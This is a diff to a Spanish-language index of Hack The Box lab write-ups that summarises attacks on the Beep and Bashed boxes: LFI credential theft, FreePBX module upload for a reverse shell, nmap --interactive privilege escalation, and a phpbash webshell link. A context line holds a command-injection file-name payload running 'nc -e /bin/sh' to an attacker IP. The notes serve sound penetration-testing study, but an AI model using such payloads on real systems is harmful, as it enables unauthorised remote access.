@@ -10,6 +10,10 @@ Con el comando siguiente: **"./=`nohup nc -e /bin/sh 10.10.14.24 443`"**
 Por otro enfoque, encontramos que el puerto **3632 distccd v1** es vulnerable, y con nmap haremos esa comprobación.
 En la fase de **postexplotación**, haremos uso de **nmap** y su funcionalidad **--interactive**.
 
+
 * [**BEEP**](https://sergiovalverde.github.io/2020/08/03/hack-the-box-beep-linux.html) : En está box, nos encontramos con el **portal web Elastix**, en el cuál damos con un **LFI**, permitiendonos **obtener usuarios y contraseña**.
 La **explotación** podemos hacer vía ssh, con el usuario y pass conseguido. O **subiendo un modulo al panel FreePBX** el cuál conseguimos una **reverse shell**.
 La **postexplotación** la haremos ejecutando **nmap** con privilegios sudo, y haciendo uso del modulo **interactive**.
+
+* [**BASHED**](https://sergiovalverde.github.io/2020/08/06/hack-the-box-bashed.html) : Nos encontramos con un servidor web, en el cuál aloja una webshell [(phpbash.php)](https://github.com/Arrexel/phpbash))
+
